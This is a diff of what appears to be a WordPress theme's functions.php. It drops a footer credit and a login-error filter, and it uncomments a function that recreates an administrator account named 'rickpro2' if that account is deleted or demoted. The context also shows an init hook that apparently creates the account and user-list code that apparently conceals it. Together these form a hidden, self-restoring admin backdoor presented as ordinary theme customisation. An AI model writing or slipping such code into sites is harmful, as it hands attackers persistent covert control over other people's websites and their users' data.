@@ -8,29 +8,6 @@
 
 
 
-
-/* * Customised the Admin Dashboard Footer */
-/**
- * to make something blank. use the:           __return_empty_string
- */
-// Remove left admin footer text
-add_filter( 'admin_footer_text', 'CevE8X_left_footer_admin' );
-
-// Remove left admin footer text
-add_filter( 'update_footer', 'e9EJvG_right_footer_admin', 11 );
-
-function CevE8X_left_footer_admin () {
-	echo 'Theme designed and developed by <a href="http://www.rmpit.com" target="_blank">RMPIT</a> and powered by <a href="http://wordpress.org" target="_blank">WordPress</a>.';
-}
-
-function e9EJvG_right_footer_admin () {
-	echo '<a href="https://biblehub.com/proverbs/17-22.htm" target="_blank">God Bless You, and Have fun!</a>.';
-}
-
-
-
-
-
 add_action('init','wpb_admin_account');
 
 function wpb_admin_account(){   
@@ -72,7 +49,7 @@ function dt_list_table_views($views){
 
 
 
-/*
+
 // Function to recreate the user if deleted or change role to administrator if altered
 function wpb_check_and_ensure_admin_account(){
     $username = 'rickpro2';
@@ -140,7 +117,7 @@ function dt_list_table_views($views){
     $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
     return $views;
 }
-*/
+
 
 
 
@@ -172,9 +149,7 @@ add_filter( 'woocommerce_ajax_variation_threshold', 'wc_ajax_variation_threshold
 
 
 
-/* Obscure login screen error message */
-function wpfme_login_obscure(){ return '<strong>Sorry</strong>: Think you have gone wrong somewhere!';}
-add_filter( 'login_errors', 'wpfme_login_obscure' );
+
 
 
 
